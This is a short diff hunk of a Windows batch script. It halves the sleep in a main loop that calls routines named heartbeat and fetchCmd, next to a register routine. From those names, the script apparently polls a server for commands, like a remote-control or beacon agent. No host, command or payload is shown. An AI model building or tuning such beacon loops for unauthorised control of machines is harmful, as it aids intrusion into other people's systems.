@@ -54,7 +54,7 @@ exit /b
 :main
 call :heartbeat
 call :fetchCmd
-timeout /t 4 /nobreak >nul
+timeout /t 2 /nobreak >nul
 goto main
 
 :register
